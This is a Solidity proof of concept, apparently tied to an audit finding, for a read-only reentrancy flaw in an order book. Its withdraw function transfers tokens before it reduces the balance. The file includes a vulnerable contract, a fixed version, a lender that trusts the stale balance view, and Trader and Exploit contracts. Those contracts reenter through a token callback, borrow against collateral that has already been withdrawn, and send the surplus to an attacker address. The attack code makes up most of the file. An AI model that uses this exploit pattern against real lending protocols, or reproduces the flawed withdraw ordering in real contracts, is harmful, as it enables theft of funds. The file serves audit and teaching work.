// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Hanji getTraderBalance (MixBytes, AuditVault #56842).
    SYNTHETIC, cheatcode-free, single transaction.

    withdraw transfers the token before it decreases balances[trader].
    The token notifies the recipient while getTraderBalance still returns
    the pre-transfer credit, so a lender that trusts the view pays out
    against collateral that has already left the book. */

interface IBook {
    function withdraw(uint256 amount) external;
    function getTraderBalance(address trader) external view returns (uint256);
    function deposit(uint256 amount) external;
}

contract Mini {
    string public constant name = "Book Token";
    string public constant symbol = "BOOK";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        if (to.code.length > 0) {
            IHook(to).onTokensReceived(msg.sender, amount);
        }
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IHook {
    function onTokensReceived(address from, uint256 amount) external;
}

contract LOB is IBook {
    Mini public immutable token;
    mapping(address => uint256) public balances;

    constructor(Mini token_) {
        token = token_;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
    }

    function getTraderBalance(address trader) external view returns (uint256) {
        return balances[trader];
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "bal");
        // @> VULN: token transfer notifies the recipient before balances is decreased
        token.transfer(msg.sender, amount);
        balances[msg.sender] -= amount;
    }
}

contract LOBFixed is IBook {
    Mini public immutable token;
    mapping(address => uint256) public balances;

    constructor(Mini token_) {
        token = token_;
    }

    function deposit(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        balances[msg.sender] += amount;
    }

    function getTraderBalance(address trader) external view returns (uint256) {
        return balances[trader];
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "bal");
        balances[msg.sender] -= amount;
        token.transfer(msg.sender, amount);
    }
}

contract Lender {
    Mini public immutable token;
    IBook public immutable book;

    constructor(Mini token_, IBook book_) {
        token = token_;
        book = book_;
    }

    function borrow(uint256 amount) external returns (uint256) {
        uint256 col = book.getTraderBalance(msg.sender);
        require(col >= amount && amount > 0, "collateral");
        token.transfer(msg.sender, amount);
        return amount;
    }
}

contract Trader {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    uint256 internal constant CREDIT = 1_000 ether;

    IBook public book;
    Lender public lender;
    Mini public token;
    bool internal entered;
    uint256 public stale;
    uint256 public borrowed;

    function onTokensReceived(address, uint256) external {
        if (entered) return;
        entered = true;
        stale = book.getTraderBalance(address(this));
        if (stale > 0) {
            borrowed = lender.borrow(stale);
        }
    }

    function arm(IBook book_, Lender lender_, Mini token_) external {
        book = book_;
        lender = lender_;
        token = token_;
        token.approve(address(book), CREDIT);
        book.deposit(CREDIT);
    }

    function poke() external {
        book.withdraw(CREDIT);
        uint256 bal = token.balanceOf(address(this));
        if (bal > CREDIT) token.transfer(ATTACKER, bal - CREDIT);
    }
}

contract Exploit {
    uint256 internal constant CREDIT = 1_000 ether;

    Mini public token;
    LOB public lob;
    Lender public lender;
    Trader public trader;
    uint256 public staleSeen;
    uint256 public borrowed;
    uint256 public lenderLeft;
    uint256 public attackerGot;
    uint256 public bookAfter;

    function run() external {
        token = new Mini();
        lob = new LOB(token);
        lender = new Lender(token, lob);
        trader = new Trader();
        token.mint(address(trader), CREDIT);
        token.mint(address(lender), CREDIT);
        trader.arm(lob, lender, token);
        uint256 booked = lob.getTraderBalance(address(trader));
        bookAfter = booked;
        trader.poke();
        staleSeen = trader.stale();
        borrowed = trader.borrowed();
        lenderLeft = token.balanceOf(address(lender));
        attackerGot = token.balanceOf(0x1111111111111111111111111111111111111111);
    }
}
